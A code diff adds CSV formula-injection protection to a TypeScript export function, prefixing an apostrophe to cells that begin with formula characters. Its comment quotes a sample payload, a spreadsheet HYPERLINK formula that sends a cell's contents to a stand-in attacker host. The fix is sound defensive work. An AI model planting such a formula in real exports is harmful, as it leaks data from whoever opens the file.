@@ -40,7 +40,17 @@ export function toCsvString<T>(rows: T[], options: Omit<ExportToCsvOptions<T>, "
 
   const escape = (value: unknown): string => {
     if (value === null || value === undefined) return "";
-    const str = String(value);
+    let str = String(value);
+
+    // CSV formula injection: Excel and Sheets execute any cell whose value starts
+    // with = + - @ (or a leading tab/CR). A customer name of
+    // `=HYPERLINK("https://evil.tld?d="&A1,"x")` contains no delimiter or quote, so
+    // RFC-4180 quoting alone leaves it bare and it runs when an admin opens the
+    // export. Prefixing an apostrophe forces the cell to be read as text.
+    if (/^[=+\-@\t\r]/.test(str)) {
+      str = `'${str}`;
+    }
+
     if (str.includes(delimiter) || str.includes('"') || str.includes("\n") || str.includes("\r")) {
       return `"${str.replace(/"/g, '""')}"`;
     }
